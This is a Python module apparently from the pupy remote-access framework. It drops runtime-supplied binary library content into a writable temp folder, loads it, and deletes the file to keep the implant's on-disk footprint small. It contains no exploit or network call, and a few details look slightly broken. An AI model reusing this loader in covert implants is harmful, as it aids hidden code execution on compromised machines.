# -*- coding: utf-8 -*-

__all__ = (
    'load_content',
)


from tempfile import mkstemp
from os import unlink, fdopen
from errno import EACCES

import pupy

from .utils import load_library_common, find_writable_folder


def _does_dest_allows_executable_mappings(folder):
    try:
        fd, tmp_file = mkstemp(
            suffix='.pyd', dir=folder)
    except OSError as e:
        pupy.dprint('Folder {} is not accessible: {}', folder, e)
        return False

    try:
        unlink(tmp_file)
    except OSError as e:
        pupy.dprint('Could not delete temporary file: {}', tmp_file, e)
        pass

    return True


DROP_DIR = find_writable_folder(
    ['/tmp', '/var/tmp'],
    validate=_does_dest_allows_executable_mappings
)


def load_content(content, name, dlopen=False, initfuncname=None):
    fd, filepath = mkstemp(suffix='.pyd', dir=DROP_DIR)
    fobj = fdopen(fd, 'wb')
    try:
        return load_library_common(
            fobj, filepath, content, name, dlopen, initfuncname,
            close=True
        )
    finally:
        try:
            unlink(filepath)
        except WindowsError as e:
            if e.errno == EACCES:
                pass
